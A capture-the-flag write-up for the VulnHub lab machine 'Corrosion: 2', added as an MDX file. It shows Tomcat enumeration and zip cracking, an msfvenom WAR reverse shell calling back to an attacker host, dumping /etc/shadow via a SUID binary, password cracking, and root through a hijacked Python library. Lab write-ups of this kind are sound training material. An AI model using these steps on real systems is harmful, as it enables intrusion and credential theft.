@@ -1,0 +1,191 @@
+---
+title: "Corrosion: 2"
+platform: "VulnHub"
+difficulty: "Medium"
+os: "Linux"
+date: "2026-06-08"
+tags: ["linux", "tomcat", "war", "zip-cracking", "suid", "python-hijack", "privilege-escalation"]
+description: "VulnHub machine running Apache Tomcat on port 8080. A password-protected backup zip exposed on the server contained tomcat-users.xml with manager credentials. Uploaded a WAR reverse shell, used a SUID look binary to dump shadow hashes, cracked randy's password, then got root by injecting a shell into a writable Python library."
+status: "complete"
+---
+
+---
+
+## 1. Information Gathering
+
+<TerminalOutput
+  cmd="nmap -A -T5 10.0.0.21"
+  rawHref="/writeups/raw/corrosion-2/nmap.txt"
+  output={`PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
+80/tcp   open  http    Apache httpd 2.4.41 (Ubuntu default page)
+8080/tcp open  http    Apache Tomcat 9.0.53`}
+/>
+
+Three ports. Tomcat on 8080 is the interesting one.
+
+---
+
+## 2. Tomcat Enumeration
+
+Nikto on port 8080 flags two things immediately.
+
+<TerminalOutput
+  cmd="nikto -h http://10.0.0.21:8080"
+  rawHref="/writeups/raw/corrosion-2/nikto-8080.txt"
+  output={`+ /backup.zip: Potentially interesting backup/cert file found.
++ /readme.txt: This might be interesting.
++ /manager/html: Tomcat Manager / Host Manager interface found (pass protected).`}
+/>
+
+`readme.txt` reads:
+
+<TerminalOutput
+  cmd="curl http://10.0.0.21:8080/readme.txt"
+  output={`Hey randy! It's your System Administrator. I left you a file on the server, I'm sure nobody will find it.
+Also remember to use that password I gave you.`}
+/>
+
+Username `randy`, and there's a file left on the server. The backup zip is right there.
+
+---
+
+## 3. backup.zip
+
+<TerminalOutput
+  cmd="zip2john backup.zip > ziphash.txt && john --wordlist=rockyou.txt ziphash.txt"
+  rawHref="/writeups/raw/corrosion-2/zip-crack.txt"
+  output={`@administrator_hi5  (backup.zip)`}
+/>
+
+Unzipping gives the Tomcat config files. `tomcat-users.xml` has credentials in plaintext:
+
+<TerminalOutput
+  cmd="grep -A2 'username' tomcat-users.xml"
+  output={`<user username="manager" password="melehifokivai" roles="manager-gui"/>
+<user username="admin"   password="melehifokivai" roles="admin-gui, manager-gui"/>`}
+/>
+
+---
+
+## 4. Tomcat Manager Shell
+
+Login to `/manager/html` with `manager:melehifokivai`.
+
+<Screenshot
+  src="/screenshots/corrosion-2/tomcat-manager.png"
+  alt="Tomcat Manager HTML interface showing deployed applications and WAR deploy section"
+  caption="Tomcat Manager — logged in as manager, WAR deploy section at the bottom"
+/>
+
+Generate a WAR reverse shell and upload it:
+
+<TerminalOutput
+  cmd="msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.52 LPORT=9001 -f war -o shell.war"
+  output={`Payload size: 1082 bytes
+Final size of war file: 13.0 kB
+Saved as: shell.war`}
+/>
+
+<Screenshot
+  src="/screenshots/corrosion-2/tomcat-upload-war.png"
+  alt="Tomcat Manager file picker with shell.war selected for deployment"
+  caption="Selecting shell.war from the payload directory to deploy through the Manager"
+/>
+
+After deploying, navigate to `http://10.0.0.21:8080/shell/` to trigger it:
+
+<Screenshot
+  src="/screenshots/corrosion-2/tomcat-shell-triggered.png"
+  alt="Browser navigated to http://10.0.0.21:8080/shell/ showing a blank page"
+  caption="Blank page — the WAR executed and the reverse shell fired"
+/>
+
+Shell catches as `tomcat`.
+
+<Screenshot
+  src="/screenshots/corrosion-2/tomcat-shell-session.png"
+  alt="Meterpreter session as tomcat user, browsing randy's home directory with note.txt and randombase64.py visible"
+  caption="Shell as tomcat — browsing the filesystem, randy's home has a note and a Python script"
+/>
+
+The password from the XML — `melehifokivai` — is also jaye's SSH password:
+
+<TerminalOutput
+  cmd="ssh jaye@10.0.0.21"
+  output={`jaye@10.0.0.21's password:
+jaye@corrosion:~$`}
+/>
+
+---
+
+## 5. Shadow Dump via SUID look
+
+jaye's `Files/` directory has a SUID root binary:
+
+<TerminalOutput
+  cmd="ls -al ~/Files"
+  output={`---s--s--x 1 root root 14728 Sep 17 2021 look`}
+/>
+
+`look` reads lines from a file beginning with a given string. An empty prefix matches every line — so this dumps all of `/etc/shadow`:
+
+<TerminalOutput
+  cmd="./look '' /etc/shadow"
+  rawHref="/writeups/raw/corrosion-2/shadow-randy.txt"
+  output={`root:$6$fHvHhNo5DWsYxgt0$...
+randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/...
+jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/...`}
+/>
+
+Crack randy's hash:
+
+<TerminalOutput
+  cmd="john --wordlist=rockyou.txt randy.hash"
+  output={`07051986randy  (randy)`}
+/>
+
+<TerminalOutput
+  cmd="ssh randy@10.0.0.21"
+  output={`randy@10.0.0.21's password:
+Welcome to Ubuntu 20.04.3 LTS
+randy@corrosion:~$`}
+/>
+
+<Note type="flag">
+  **user.txt** — `ca73a018ae6908a7d0ea5d1c269ba4b6`
+</Note>
+
+---
+
+## 6. Privilege Escalation — randy → root
+
+<TerminalOutput
+  cmd="sudo -l"
+  output={`(root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py`}
+/>
+
+Randy can sudo `randombase64.py` as root with their own password. The script imports `base64`. Check if that library is writable:
+
+<TerminalOutput
+  cmd="find /usr/lib/python3.8 -writable 2>/dev/null"
+  output={`/usr/lib/python3.8/base64.py`}
+/>
+
+It is. Open `base64.py` and inject `os.system("/bin/bash")` inside the `b64encode` function — it runs when the script imports and calls anything from base64:
+
+<Screenshot
+  src="/screenshots/corrosion-2/base64-injected.png"
+  alt="nano editor open on /usr/lib/python3.8/base64.py with os.system('/bin/bash') injected inside b64encode"
+  caption="os.system('/bin/bash') dropped into b64encode — sudo will execute this as root"
+/>
+
+<TerminalOutput
+  cmd="sudo /usr/bin/python3.8 /home/randy/randombase64.py"
+  output={`Enter your string: sad
+root@corrosion:/home/randy#`}
+/>
+
+<Note type="flag">
+  **root.txt** — `2fdbf8d4f894292361d6c72c8e833a4b`
+</Note>
